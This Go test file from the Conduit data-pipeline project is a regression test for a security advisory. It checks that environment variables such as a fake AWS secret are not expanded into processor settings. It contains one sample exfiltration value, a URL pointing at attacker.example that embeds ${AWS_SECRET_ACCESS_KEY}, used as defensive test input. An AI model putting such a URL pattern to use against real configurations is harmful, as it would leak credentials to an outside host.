// Copyright © 2026 Meroxa, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package processor

import (
	"context"
	"strings"
	"testing"

	"github.com/conduitio/conduit-commons/config"
	"github.com/conduitio/conduit/pkg/foundation/cerrors/conduiterr"
	"github.com/matryer/is"
	"go.uber.org/mock/gomock"

	proc_mock "github.com/conduitio/conduit/pkg/plugin/processor/mock"
)

// TestRunnableProcessor_Open_DoesNotExpandEnv is the C2a regression for
// processor settings (GHSA-m3mw-fpw8-w765): a ${VAR} reference never reaches
// the processor expanded unless the operator allowed that variable.
func TestRunnableProcessor_Open_DoesNotExpandEnv(t *testing.T) {
	is := is.New(t)
	ctx := context.Background()
	t.Setenv("AWS_SECRET_ACCESS_KEY", "AKIA-super-secret-value")

	var configured []config.Config
	p := proc_mock.NewProcessor(gomock.NewController(t))
	p.EXPECT().Configure(gomock.Any(), gomock.Any()).DoAndReturn(func(_ context.Context, c config.Config) error {
		configured = append(configured, c)
		return nil
	}).AnyTimes()
	p.EXPECT().Open(gomock.Any()).Return(nil).AnyTimes()

	i := newTestInstance()
	i.Config.Settings = map[string]string{"request.url": "http://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"}
	underTest := newRunnableProcessor(p, nil, i)

	err := underTest.Open(ctx)

	for _, c := range configured {
		for _, v := range c {
			is.True(!strings.Contains(v, "AKIA-super-secret-value")) // secret must not reach the processor
		}
	}
	is.True(err != nil)
	ce, ok := conduiterr.Get(err)
	is.True(ok)
	is.True(strings.HasPrefix(ce.Code.Reason(), "config.env_"))
	is.True(!strings.Contains(err.Error(), "AKIA-super-secret-value"))
}
